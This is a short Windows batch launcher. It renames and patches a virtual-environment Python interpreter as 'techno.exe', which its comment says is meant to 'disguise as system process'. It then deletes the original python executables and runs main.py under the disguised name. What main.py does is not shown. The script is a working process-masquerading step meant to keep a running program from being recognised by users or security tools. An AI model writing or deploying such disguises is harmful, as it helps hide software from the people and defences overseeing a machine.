@echo off
cd /d "%~dp0"
set "VENV=%~dp0.venv\Scripts"
:: Single instance
taskkill /F /IM techno.exe >nul 2>&1
:: Create techno.exe and disguise as system process
if not exist "%VENV%\techno.exe" (
    copy /Y "%VENV%\python.exe" "%VENV%\techno.exe" >nul 2>&1
    "%VENV%\python.exe" "%~dp0patch_exe.py" "%VENV%\techno.exe" >nul 2>&1
)
:: Remove python executables
if exist "%VENV%\python.exe" del /F /Q "%VENV%\python.exe" >nul 2>&1
if exist "%VENV%\pythonw.exe" del /F /Q "%VENV%\pythonw.exe" >nul 2>&1
"%VENV%\techno.exe" main.py
